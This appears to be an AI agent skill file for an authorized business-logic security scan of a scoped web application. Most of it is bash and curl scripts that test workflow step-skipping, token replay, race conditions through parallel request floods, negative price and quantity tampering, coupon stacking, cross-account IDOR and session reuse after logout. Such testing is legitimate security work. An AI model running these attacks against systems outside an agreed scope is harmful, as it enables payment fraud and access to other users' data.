---
name: logic-scan
description: >
  Runs an authorized business logic security assessment. Tests multi-step workflow bypass
  (state-skip, token replay), race conditions via parallel request flooding, price and
  quantity parameter manipulation, TOCTOU auth flaws, horizontal privilege escalation
  between accounts, and coupon/balance abuse. Requires scope.txt with at least one
  authenticated session. Produces JSON + Markdown findings compatible with escalate-scan.
  Use when the user invokes "logic-scan", "business logic test", "race condition test",
  "workflow bypass", "price manipulation", "TOCTOU", "horizontal privilege escalation",
  or "account enumeration".
---

# Logic Scan — Business Logic Vulnerability Assessment

## Purpose

Discover vulnerabilities structural scanners miss: flaws in how the application
enforces its own business rules. These are the highest-value findings in modern
bug bounty and enterprise pentests.

Steps marked **always run** use only `curl`/`grep` — no specialist tools required.
Steps requiring a specific tool print `[skip] <tool> — run: bash install.sh` and continue.

Before starting, read **[references/logic_patterns.md](references/logic_patterns.md)**
and **[references/race_condition_guide.md](references/race_condition_guide.md)** for
vulnerability indicators and timing-window methodology.

## Scan Progress Checklist

```
Logic Scan Progress:
- [ ] Phase 0:  Scope loaded, sessions built, output dir created
- [ ] Phase 1:  Application flow mapping (state machine)
- [ ] Phase 2:  Workflow bypass and state-skip testing
- [ ] Phase 3:  Race condition testing (parallel request flood)
- [ ] Phase 4:  Parameter manipulation (price, quantity, discount, IDs)
- [ ] Phase 5:  Horizontal privilege escalation (cross-account IDOR)
- [ ] Phase 6:  TOCTOU and auth-timing flaws
- [ ] Phase 7:  Report compiled (JSON + Markdown)
```

---

## Phase 0 — Scope & Session Setup

1. Read `scope.txt`: extract `TARGET_URL`, `AUTH_HEADER`, `LOGIN_URL`,
   `LOGIN_CREDENTIALS`, `CREDENTIAL_SETS`, `OUT_OF_SCOPE_VULNS`, `RATE_LIMIT_DELAY`.

2. If `CREDENTIAL_SETS` has ≥ 2 entries, source the session builder to obtain
   `SESSION_A` and `SESSION_B`:

   ```bash
   source skills/stress-scan/script/build_sessions.sh 2>/dev/null || true
   SESSION_A="${SESSION_A:-$AUTH_HEADER}"
   SESSION_B="${SESSION_B:-}"
   ```

3. Create the output directory:

   ```bash
   TIMESTAMP=$(date +%Y%m%d_%H%M%S)
   OUTDIR="skills/logic-scan/assets/run_${TIMESTAMP}"
   mkdir -p "$OUTDIR"
   LOG="$OUTDIR/scan_log.md"
   echo "# Logic Scan Log — $TIMESTAMP" > "$LOG"
   ```

4. Check for stress-recon output (used to enrich Phase 1 + Phase 3 targeting):

   ```bash
   RECON_DIR=$(ls -td reports/assets/stress_*_* 2>/dev/null | head -1)
   if [[ -n "$RECON_DIR" ]]; then
     cp "$RECON_DIR/patterns/ranked_urls.txt" "$OUTDIR/ranked_urls.txt" 2>/dev/null
     echo "[logic-scan] Loaded recon data from $RECON_DIR"
   fi
   ```

Print the confirmation banner:

```
[logic-scan] Target  : <TARGET_URL>
[logic-scan] Session : <authenticated/unauthenticated>
[logic-scan] Accounts: <N credential sets>
[logic-scan] Recon   : <loaded N ranked URLs / standalone>
```

---

## Phase 1 — Application Flow Mapping (always run)

```bash
# Discover functional, multi-step endpoints
curl -sk -H "$AUTH_HEADER" "$TARGET_URL" \
  | grep -iE "(checkout|cart|order|payment|transfer|withdraw|redeem|coupon|discount|invite|register|upgrade|subscription|refund|confirm|verify|reset|activate|delete|export|import|bulk)" \
  | grep -oE 'href="[^"]+"' | sed 's/href="//;s/"//' | sort -u \
  > "$OUTDIR/functional_endpoints.txt"

FUNC_COUNT=$(wc -l < "$OUTDIR/functional_endpoints.txt")
echo "[logic-scan] Functional endpoints discovered: $FUNC_COUNT"
```

Document each multi-step flow in `$OUTDIR/flows.md`. For each flow record:

- Step sequence (Step 1 → Step 2 → …)
- Required state for each step (authenticated, cart_not_empty, payment_token, …)
- Token parameters used (`order_id`, `confirmation_code`, `invite_token`)

This file feeds Phase 2.

---

## Phase 2 — Workflow Bypass & State-Skip Testing (always run)

For each flow recorded in `$OUTDIR/flows.md`:

### 2a — Step skip test

```bash
# Can the final step be reached without completing earlier steps?
# Test with a fresh session that has no prior state.
FINAL_STEP_URL="$TARGET_URL/order/confirm"
STATUS=$(curl -sk -o "$OUTDIR/step_skip.html" -w "%{http_code}" \
  -H "Authorization: Bearer NEW_SESSION_TOKEN" \
  "$FINAL_STEP_URL")
echo "[logic-scan] Step skip test: HTTP $STATUS"
# Verified if: 200 AND response body contains success/confirmed state
```

### 2b — Token replay test

```bash
# After legitimately completing a flow, replay the same token.
STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
  -X POST -H "$AUTH_HEADER" \
  -d "token=$CAPTURED_TOKEN" "$TARGET_URL/order/confirm")
echo "[logic-scan] Token replay: HTTP $STATUS"
# Verified finding if: 200 (not 4xx)
```

### 2c — Post-completion state mutation

```bash
# Can the user modify the order after the payment step?
STATUS=$(curl -sk -o "$OUTDIR/post_pay_cart.html" -w "%{http_code}" \
  -X POST -H "$AUTH_HEADER" \
  -d "item_id=1&quantity=100" "$TARGET_URL/cart/add")
echo "[logic-scan] Post-payment cart add: HTTP $STATUS"
# Verified if: 200 AND cart total changes
```

Record any verified results in `$OUTDIR/workflow_findings.txt` with the
`[FINDING]` prefix used by Phase 7.

---

## Phase 3 — Race Condition Testing (always run; skip if `OUT_OF_SCOPE_VULNS` contains `race-condition`)

### 3a — Identify high-value targets

Priority order: coupon, balance transfer, voucher, invite, withdrawal, points.

```bash
grep -iE "(coupon|voucher|redeem|transfer|withdraw|referral|credit|points)" \
  "$OUTDIR/functional_endpoints.txt" "$OUTDIR/ranked_urls.txt" 2>/dev/null \
  | sort -u > "$OUTDIR/race_targets.txt"
echo "[logic-scan] Race condition targets: $(wc -l < "$OUTDIR/race_targets.txt")"
```

### 3b — Parallel request flood (always run — `curl` only)

```bash
while IFS= read -r endpoint; do
  FLOOD_LOG="$OUTDIR/race_$(echo "$endpoint" | md5sum | cut -c1-8).txt"
  > "$FLOOD_LOG"
  for i in $(seq 1 15); do
    curl -sk -X POST -H "$AUTH_HEADER" \
      -d "code=TESTCODE10" "$endpoint" \
      -o "/dev/null" -w "%{http_code}\n" >> "$FLOOD_LOG" &
  done
  wait
  SUCCESS=$(grep -c "200" "$FLOOD_LOG" 2>/dev/null || echo 0)
  echo "[race-test] $endpoint — $SUCCESS/15 returned 200"
  [[ "$SUCCESS" -gt 1 ]] && \
    echo "[FINDING] Race condition: $endpoint" >> "$OUTDIR/race_findings.txt"
done < "$OUTDIR/race_targets.txt"
```

Use the median of 3 floods to absorb network jitter — see
`references/race_condition_guide.md` for the 4-second timing window rationale.

### 3c — Burp Intruder single-packet attack (when `BURP_ENABLED=1`)

The `curl &` flood in 3b approximates parallel arrival but TCP-stack jitter
on the local socket buffer means requests typically land 5-40 ms apart. For
endpoints whose check-then-act window is shorter than that (small DB
transactions, Redis-backed counters), the curl flood misses races that
would be caught by a true single-packet attack.

When `BURP_ENABLED=1` AND Burp's MCP exposes the `Turbo Intruder` extension
(detected via `mcp__burp__output_user_options` — see burp-scan Phase 0b),
prefer the Turbo Intruder path:

```
1. Build a base request for each race target (one POST per endpoint).
2. Call mcp__burp__send_to_intruder with payload positions and the
   single-packet attack mode option.
3. Wait for completion, then read responses via the proxy history.
4. Apply the same SUCCESS-count threshold (≥ 2 of N returned 200) to
   flag the finding.
```

If Burp is enabled but Turbo Intruder is NOT installed, the regular
Intruder still tightens timing relative to curl `&`. Use it as a
mid-tier fallback. Order of preference per endpoint:

```
Turbo Intruder (single-packet)   ← best when available
Regular Intruder                 ← used when only base Intruder is up
curl & flood with median-of-3    ← always-available baseline
```

Burp findings produced via Turbo Intruder are tagged
`evidence_type: "exploitation"` because the response body confirms the
double-redemption (e.g., `used_count: 2` after the flood). curl-flood
findings without OOB confirmation stay `evidence_type: "inferred"` per
Phase 7 mapping.

---

## Phase 4 — Parameter Manipulation (always run)

```bash
# Price / quantity manipulation across cart/checkout endpoints
for endpoint in $(grep -iE "(cart|checkout|purchase|order)" \
                  "$OUTDIR/functional_endpoints.txt"); do
  # Negative quantity
  curl -sk -X POST -H "$AUTH_HEADER" \
    -d "item_id=1&quantity=-1" "$endpoint" \
    -o "$OUTDIR/neg_qty.html" -w " HTTP:%{http_code}\n"
  # Negative price
  curl -sk -X POST -H "$AUTH_HEADER" \
    -d "item_id=1&price=-9.99" "$endpoint" \
    -o "$OUTDIR/neg_price.html" -w " HTTP:%{http_code}\n"
  # Integer overflow
  curl -sk -X POST -H "$AUTH_HEADER" \
    -d "item_id=1&quantity=2147483647" "$endpoint" \
    -o "$OUTDIR/overflow.html" -w " HTTP:%{http_code}\n"
done

# Discount stacking — apply the same coupon twice
curl -sk -X POST -H "$AUTH_HEADER" -d "coupon=SAVE10" \
  "$TARGET_URL/cart/coupon" -w " %{http_code}\n"
curl -sk -X POST -H "$AUTH_HEADER" -d "coupon=SAVE10" \
  "$TARGET_URL/cart/coupon" -w " %{http_code}\n"
```

Verified finding if: order total reduced/zeroed, negative balance created, or the
second coupon application returns 200 and a further discount is applied.

---

## Phase 5 — Horizontal Privilege Escalation (skip if < 2 accounts)

```bash
if [[ -z "$SESSION_B" ]]; then
  echo "[logic-scan] Phase 5 skipped — configure CREDENTIAL_SETS with 2 accounts"
else
  # Create a resource as Account A
  RESOURCE_ID=$(curl -sk -X POST -H "Authorization: $SESSION_A" \
    -d '{"title":"Private Test Resource"}' "$TARGET_URL/api/notes" \
    | grep -oE '"id":"[^"]+"' | head -1 | cut -d'"' -f4)

  echo "[logic-scan] Account A resource: $RESOURCE_ID"

  # Attempt access as Account B
  B_STATUS=$(curl -sk -o "$OUTDIR/horiz_priv.txt" -w "%{http_code}" \
    -H "Authorization: $SESSION_B" "$TARGET_URL/api/notes/$RESOURCE_ID")

  echo "[logic-scan] Account B access: HTTP $B_STATUS"
  [[ "$B_STATUS" == "200" ]] && \
    echo "[FINDING] Horizontal priv esc (IDOR): /api/notes/$RESOURCE_ID" \
      >> "$OUTDIR/horiz_findings.txt"
fi
```

---

## Phase 6 — TOCTOU Auth-Timing Flaws (always run)

```bash
# Fetch a resource with a valid token
curl -sk -H "$AUTH_HEADER" "$TARGET_URL/api/profile" > "$OUTDIR/toctou_before.txt"

# Invalidate the token
curl -sk -X POST -H "$AUTH_HEADER" "$TARGET_URL/logout" > /dev/null 2>&1

# Re-send the original request immediately with the now-invalid token
curl -sk -H "$AUTH_HEADER" "$TARGET_URL/api/profile" > "$OUTDIR/toctou_after.txt"

diff "$OUTDIR/toctou_before.txt" "$OUTDIR/toctou_after.txt" > "$OUTDIR/toctou_diff.txt"
DIFF_LINES=$(wc -l < "$OUTDIR/toctou_diff.txt")
[[ "$DIFF_LINES" -eq 0 ]] && \
  echo "[FINDING] TOCTOU — request succeeded after logout" \
    >> "$OUTDIR/toctou_findings.txt"
echo "[logic-scan] TOCTOU diff lines: $DIFF_LINES (0 = potential finding)"
```

---

## Phase 7 — Report Generation

Collect every finding produced this session:

- `$OUTDIR/workflow_findings.txt`
- `$OUTDIR/race_findings.txt`
- `$OUTDIR/horiz_findings.txt`
- `$OUTDIR/toctou_findings.txt`
- Inline parameter-manipulation findings from Phase 4

Write `reports/report_logic_${TIMESTAMP}.json` using the schema from
`templates/report_schema.json`. ID prefix: `LG-NNN`.

Each finding must include:

- `id`, `title`, `severity`, `affected_url`, `evidence`, `verified` (true/false)
- `evidence_type`: `exploitation` | `inferred`
- `verification_output`: actual `curl` response excerpt
- `vuln_class`: `race_condition` | `workflow_bypass` | `idor` |
  `parameter_manipulation` | `toctou` | `token_replay`

Severity mapping (see `references/logic_patterns.md` for the full guide):

| Class                    | Default severity |
|--------------------------|------------------|
| race_condition (money)   | Critical         |
| workflow_bypass (paid)   | Critical         |
| idor (PII)               | High             |
| parameter_manipulation   | High             |
| toctou                   | High             |
| token_replay             | High             |

Write the companion `reports/report_logic_${TIMESTAMP}.md` using the
project-standard `templates/report_template.md` layout.

Print the closing banner:

```
[logic-scan] Complete.
  Critical: N  High: N  Medium: N  Low: N  Info: N
  Report: reports/report_logic_<timestamp>.json
  Next: run escalate-scan --report reports/report_logic_*.json
```
